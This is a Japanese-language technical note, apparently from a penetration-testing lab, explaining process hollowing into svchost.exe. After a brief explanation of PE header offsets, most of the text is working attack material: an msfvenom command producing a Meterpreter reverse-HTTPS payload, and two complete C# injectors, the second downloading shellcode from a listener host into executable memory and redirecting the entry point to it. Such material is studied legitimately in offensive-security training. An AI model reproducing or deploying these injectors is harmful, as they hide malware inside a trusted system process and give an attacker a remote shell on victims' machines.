# 解説
### 全体の流れ

```
① CreateProcess(CREATE_SUSPENDED)
        ↓
   プロセス作成、スレッド停止状態
        ↓
② ZwQueryInformationProcess
        ↓
   PEBのアドレスを取得
        ↓
③ ReadProcessMemory(PEB + 0x10)
        ↓
   EXEのベースアドレスを取得
        ↓
④ ReadProcessMemory(ベースアドレスから0x200バイト読む)
        ↓
   PEヘッダを解析してEntryPointを特定
        ↓
⑤ WriteProcessMemory(EntryPoint)
        ↓
   シェルコードを上書き
        ↓
⑥ ResumeThread
        ↓
   シェルコード実行
```

---

### PEヘッダの読み方（ここが一番わかりづらい部分）

メモリ上のEXEは必ずこの構造に従っている：

```
[ベースアドレス]
│
├── +0x00  "MZ"（DOSヘッダ開始）
│
├── +0x3C  e_lfanew ← 「PEヘッダまでの距離」が書いてある
│                      ここを読むことでPEヘッダの場所がわかる
│
├── +[e_lfanewの値]  "PE"（PEヘッダ開始）
│
└── +[e_lfanewの値] + 0x28  AddressOfEntryPoint（RVA）
                              ← ここを読みたい
```

---

### 数式にすると

```
① PEヘッダの場所    = ベースアドレス + e_lfanew
② EntryPointのRVA  = PEヘッダの場所 + 0x28
③ EntryPointの実アドレス = ベースアドレス + RVA
```

## code
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f csharp
```

bufをハードコードするプロセスホロウィングコード
```c#
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace Hollow
{
    class Program
    {
        // ─────────────────────────────────────────
        // 構造体定義
        // ─────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        // ─────────────────────────────────────────
        // DllImport定義
        // ─────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        // ─────────────────────────────────────────
        // Main
        // ─────────────────────────────────────────

        static void Main(string[] args)
        {
            // ① svchost.exeをサスペンド状態で起動
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,            // CREATE_SUSPENDED
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (!res)
            {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] CreateProcess OK - PID: " + pi.dwProcessId);

            // ② ZwQueryInformationProcessでPEBアドレスを取得
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            ZwQueryInformationProcess(
                hProcess,
                0,              // ProcessBasicInformation
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref tmp);

            // PEB + 0x10 = EXEベースアドレスが書いてある場所
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            Console.WriteLine("[+] PEB Address: 0x" + bi.PebAddress.ToString("X"));
            Console.WriteLine("[+] Ptr to ImageBase: 0x" + ptrToImageBase.ToString("X"));

            // ③ ReadProcessMemoryでEXEのベースアドレスを読む（8バイト = 64bit）
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine("[+] svchost.exe Base: 0x" + svchostBase.ToString("X"));

            // ④ PEヘッダを読んでEntryPointを特定
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // 0x3C → PEヘッダまでのオフセット（e_lfanew）
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            // PEヘッダ先頭 + 0x28 → EntryPointのRVA
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // RVA + ベースアドレス = EntryPointの実アドレス
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine("[+] EntryPoint: 0x" + addressOfEntryPoint.ToString("X"));

            // ⑤ シェルコードをダウンロード
            byte[] buf = new byte[868] {0xfc,0x48, 0xd5};

            Console.WriteLine("[+] Shellcode size: " + buf.Length + " bytes");

            // ⑥ EntryPointにシェルコードを上書き
            IntPtr outSize;
            bool written = WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out outSize);

            if (!written)
            {
                Console.WriteLine("[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] WriteProcessMemory OK: " + outSize + " bytes written");

            // ⑦ サスペンドスレッドを再開してシェルコード実行
            uint resumed = ResumeThread(pi.hThread);
            if (resumed == 0xFFFFFFFF)
            {
                Console.WriteLine("[-] ResumeThread failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] ResumeThread OK - shellcode executing in svchost.exe");
        }
    }
}
```


ペイロードダウンロード & 領域確保 -> jmp版
```c#
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess, int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        // ★ 追加
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // ① svchost.exeをサスペンド状態で起動
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero, IntPtr.Zero, false, 0x4,
                IntPtr.Zero, null, ref si, out pi);

            if (!res)
            {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] CreateProcess OK - PID: " + pi.dwProcessId);

            IntPtr hProcess = pi.hProcess;

            // ② PEBからEntryPointを特定
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(hProcess, 0, ref bi,
                (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            Console.WriteLine("[+] PEB: 0x" + bi.PebAddress.ToString("X"));

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine("[+] svchost Base: 0x" + svchostBase.ToString("X"));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr          = e_lfanew_offset + 0x28;
            uint entrypoint_rva  = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine("[+] EntryPoint: 0x" + addressOfEntryPoint.ToString("X"));

            // ③ シェルコードをダウンロード
            byte[] buf = new WebClient()
                .DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
            Console.WriteLine("[+] Shellcode size: " + buf.Length + " bytes");

            // ④ ★ シェルコード用に新規RWXメモリを確保
            IntPtr shellcodeAddr = VirtualAllocEx(hProcess, IntPtr.Zero,
                (uint)buf.Length, 0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE

            if (shellcodeAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode region: 0x" + shellcodeAddr.ToString("X"));

            // ⑤ ★ シェルコードを新規領域に書き込む
            IntPtr outSize;
            WriteProcessMemory(hProcess, shellcodeAddr, buf, buf.Length, out outSize);
            Console.WriteLine("[+] Shellcode written: " + outSize + " bytes");

            // ⑥ ★ EntryPointに14バイトのjmpトランポリンを書き込む
            //    FF 25 00 00 00 00 + 8バイトアドレス
            //    = jmp qword ptr [rip+0] → shellcodeAddr
            byte[] trampoline = new byte[14];
            trampoline[0] = 0xFF;
            trampoline[1] = 0x25;
            trampoline[2] = 0x00;
            trampoline[3] = 0x00;
            trampoline[4] = 0x00;
            trampoline[5] = 0x00;
            Array.Copy(BitConverter.GetBytes((ulong)shellcodeAddr), 0, trampoline, 6, 8);

            WriteProcessMemory(hProcess, addressOfEntryPoint,
                trampoline, trampoline.Length, out outSize);
            Console.WriteLine("[+] Trampoline written at EntryPoint");

            // ⑦ スレッド再開
            uint resumed = ResumeThread(pi.hThread);
            if (resumed == 0xFFFFFFFF)
            {
                Console.WriteLine("[-] ResumeThread failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] ResumeThread OK");
        }
    }
}
```